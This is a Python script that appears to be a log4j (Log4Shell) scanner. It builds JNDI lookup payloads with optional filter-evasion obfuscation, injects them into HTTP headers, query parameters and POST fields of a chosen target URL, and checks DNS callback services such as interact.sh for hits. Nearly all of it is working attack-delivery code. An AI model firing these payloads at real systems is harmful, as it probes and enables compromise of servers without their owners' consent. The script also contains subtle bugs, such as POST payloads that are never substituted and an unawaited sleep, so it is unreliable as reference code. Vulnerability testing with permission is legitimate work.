import argparse
import asyncio
from asyncio.tasks import sleep
import base64
import json
import random
import string
import uuid
from enum import Enum
from urllib.parse import urlparse

import requests
from aiohttp import ClientSession
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA


class Dnslog:
    def __init__(self):
        self._session = requests.session()
        req = self._session.get("http://www.dnslog.cn/getdomain.php", timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self._session.get("http://www.dnslog.cn/getrecords.php", timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/fullhunt/log4j-scan/blob/7be0f1c02ce3494469dc73a177e6f0c96f0016d9/log4j-scan.py#L163
    def __init__(self, token="", server=""):
        # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid.uuid4())
        self.encoded = base64.b64encode(self.public_key).decode("utf8")
        guid = uuid.uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        blocksize = AES.block_size
        initialisation_vector = decode[:blocksize]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=initialisation_vector, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


class InjectionPointType(Enum):
    Header = "header"
    GetParam = "get"
    PostParam = "post"


PROTOCOLS = [
    "dns", "ldap", "ldaps", "rmi",
]

OBFUSCATIONS = [
    r"[CHAR]", r"${::-[CHAR]}", r"${lower:[CHAR]}", r"${upper:[CHAR]}"
]

HEADERS = [
    "Referer",
    "X-Api-Version",
    "Accept",
    "User-Agent",
    "X-Forwarded-For",
    "Origin",
    "Cookie",
    "Accept-Encoding",
    "Accept-Language",
]

POST_BODY = {
    'username': "[PAYLOAD]",
    'user': "[PAYLOAD]",
    'email': "[PAYLOAD]",
    'account': "[PAYLOAD]",
    'password': "[PAYLOAD]",
    'name': "[PAYLOAD]",
    'message': "[PAYLOAD]"
}

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}

proxy = None
obfuscate_payloads = True
request_path = None


def obfuscate_string(to_obfuscate: str) -> str:
    out = []
    for char in to_obfuscate:
        obfuscation: str = random.choice(OBFUSCATIONS)
        if "${" in obfuscation:
            obfuscation = obfuscation.replace("[CHAR]", random.choice(OBFUSCATIONS))
        out.append(obfuscation.replace("[CHAR]", char))
    return "".join(out)


def create_payload(callback_url: str, protocol: str, test_path: str, test_domain: str = None, include_domain: bool = True, obfuscate: bool = True) -> str:
    format_str = "${{{jndi}:{protocol}://{target_callback}/{path}}}"

    if include_domain:
        target = f"{test_domain}.{callback_url}"
    else:
        target = callback_url
    return format_str.format(
        jndi=(obfuscate_string("jndi") if obfuscate else "jndi"),
        protocol=(obfuscate_string(protocol) if obfuscate else protocol),
        target_callback=target,
        path=test_path
    )


async def send_requests(session: ClientSession, url: str, headers: dict, get_params: dict, post_params: dict) -> None:
    opened_requests = [
        session.get(
            url,
            params=get_params,
            headers=headers,
            timeout=3,
            ssl=False,
            proxy=proxy
        ),
        session.post(
            url,
            params=get_params,
            headers=headers,
            data=post_params,
            timeout=3,
            ssl=False,
            proxy=proxy
        ),
        session.post(
            url,
            params=get_params,
            headers=headers,
            json=post_params,
            timeout=3,
            ssl=False,
            proxy=proxy
        ),
    ]
    for request in opened_requests:
        try:
            await request
        except Exception as excep:
            print(excep)


async def test_injection_point(injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True, test_path: str = None):
    print(f"Testing injection in {injection_type.value} with {callback_host} for {url}")
    session = ClientSession()
    if choose_random_path:
        target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
    else:
        target_path = test_path

    for protocol in PROTOCOLS:
        payload = create_payload(callback_host, protocol, target_path, urlparse(url).netloc, is_domain_in_callback)
        print(f"Using payload: {payload}")
        if injection_type == InjectionPointType.GetParam:
            params = {
                "q": payload
            }
        else:
            params = None
        if injection_type == InjectionPointType.PostParam:
            data = POST_BODY.copy()
            for value in data.values():
                value.replace("[PAYLOAD]", payload)
        else:
            data = None
        if injection_type == InjectionPointType.Header:
            headers_to_inject = [
                {header_name: payload} for header_name in HEADERS
            ]
        else:
            headers_to_inject = [DEFAULT_HEADERS]

        for header in headers_to_inject:
            if "User-Agent" not in header.keys():
                headers = DEFAULT_HEADERS.copy()
                headers.update(header)
            else:
                headers = header
            await send_requests(session, url, headers, params, data)


async def test_all_injection_points(url: str, callback: str):
    for injection_type in InjectionPointType:
        await test_injection_point(injection_type, callback, url, True, True)


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser("A scanner to check for the log4j vulnerability")

    parser.add_argument('-u', '--url', help="The target to check", type=str, required=True)
    parser.add_argument('-p', '--proxy', help="A proxy URL", type=str, default=None)
    parser.add_argument('-o', '--obfuscate', help="Whether payloads should be obfuscated or not", type=bool, default=False, action="store_true")
    parser.add_argument('--request-path', help="A custom path to add to the requests", type=str, default=None, action="store")

    callback_group = parser.add_mutually_exclusive_group()
    callback_group.add_argument('--dns-callback', help="Which built-in DNS callback to use", type=str, choices=["interact.sh", "dnslog.cn"], default="interact.sh")
    callback_group.add_argument('--custom-callback', help="A different callback to use. Won't be checked by the application.", type=str, default=None)

    return parser.parse_args()


def main():
    arguments = parse_arguments()

    if arguments.proxy:
        global proxy
        proxy = arguments.proxy

    if arguments.request_path:
        global request_path
        request_path = arguments.request_path

    if arguments.obfuscate:
        global obfuscate_payloads
        obfuscate_payloads = True

    dns_callback = None

    if arguments.custom_callback:
        callback_domain = arguments.custom_callback
    else:
        if arguments.dns_callback == "interact.sh":
            dns_callback = Interactsh()
        else:
            dns_callback = Dnslog()
        callback_domain = dns_callback.domain

    asyncio.run(test_all_injection_points(arguments.url, callback_domain))

    if not dns_callback:
        return

    sleep(10)
    records = dns_callback.pull_logs()
    print(records)


if __name__ == "__main__":
    main()
